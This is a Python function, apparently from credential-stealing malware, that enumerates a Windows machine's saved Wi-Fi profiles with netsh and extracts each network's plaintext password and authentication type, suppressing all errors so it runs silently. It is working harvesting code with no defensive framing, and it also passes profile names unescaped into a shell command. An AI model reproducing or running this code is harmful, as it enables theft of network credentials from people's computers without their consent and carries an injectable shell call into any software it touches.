def grab_wifi():
    wifi_data = []
    try:
        output = subprocess.check_output(
            "netsh wlan show profiles",
            shell=True,
            stderr=subprocess.DEVNULL,
        ).decode("utf-8", errors="ignore")
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", output)
        for profile in profiles:
            profile = profile.strip()
            try:
                result = subprocess.check_output(
                    f'netsh wlan show profile name="{profile}" key=clear',
                    shell=True,
                    stderr=subprocess.DEVNULL,
                ).decode("utf-8", errors="ignore")
                pw_match = re.findall(r"Key Content\s*:\s*(.*)", result)
                password = pw_match[0].strip() if pw_match else ""
                auth_match = re.findall(r"Authentication\s*:\s*(.*)", result)
                auth = auth_match[0].strip() if auth_match else "Unknown"
                wifi_data.append(
                    {"ssid": profile, "password": password, "auth": auth}
                )
            except Exception:
                pass
    except Exception:
        pass
    return wifi_data
